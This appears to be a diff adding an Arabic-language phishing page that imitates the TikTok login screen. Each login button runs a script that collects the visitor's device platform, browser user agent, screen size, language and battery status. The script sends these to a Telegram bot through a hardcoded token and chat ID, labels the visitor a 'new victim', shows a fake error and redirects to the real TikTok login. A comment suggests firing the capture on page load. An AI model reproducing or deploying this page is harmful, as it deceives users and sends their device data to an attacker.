@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول | TikTok</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #161823;
+        }
+        p {
+            color: #6a6a6a;
+            margin-bottom: 30px;
+        }
+        .btn-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #e3e3e4;
+            background: #fff;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.2s;
+        }
+        .btn-login:hover {
+            background: #f8f8f8;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/media/logo-dark.0602f37e.svg" alt="TikTok" class="logo">
+    <h2>تسجيل الدخول إلى TikTok</h2>
+    <p>إدارة حسابك وحماية خصوصيتك</p>
+    
+    <div class="btn-login" onclick="startCapture()">استخدام الهاتف / البريد الإلكتروني</div>
+    <div class="btn-login" onclick="startCapture()">المتابعة مع Facebook</div>
+    <div class="btn-login" onclick="startCapture()">المتابعة مع Google</div>
+</div>
+
+<script>
+    // الدالة التي تجمع البيانات وترسلها عند الضغط على أي زر
+    async function startCapture() {
+        // 1. جمع المعلومات الأساسية
+        const info = {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            lang: navigator.language
+        };
+
+        // 2. محاولة جلب البطارية
+        let batteryInfo = "غير متوفر";
+        try {
+            const b = await navigator.getBattery();
+            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
+        } catch(e) {}
+
+        // 3. تجهيز الرسالة للبوت الخاص بك
+        const text = `
+🚀 **ضحية جديدة دخلت صفحة تيك توك:**
+-----------------------------
+📱 الجهاز: ${info.platform}
+📏 الشاشة: ${info.screen}
+🔋 البطارية: ${batteryInfo}
+🌐 اللغة: ${info.lang}
+📝 المتصفح: ${info.userAgent}
+-----------------------------
+        `;
+
+        const token = "8246017757:AAGtxsS6RpwlNgLgbmkdDwyyr6BRjLNQ1BE";
+        const chatId = "5839429427";
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+        // 4. الإرسال ثم التوجيه للموقع الحقيقي
+        fetch(url).then(() => {
+            alert("حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى.");
+            window.location.href = "https://www.tiktok.com/login";
+        }).catch(() => {
+            window.location.href = "https://www.tiktok.com/login";
+        });
+    }
+
+    // ملاحظة: بمجرد فتح الصفحة، يمكنك أيضاً إرسال البيانات تلقائياً دون انتظار الضغط
+    // window.onload = startCapture; 
+</script>
+
+</body>
+</html>
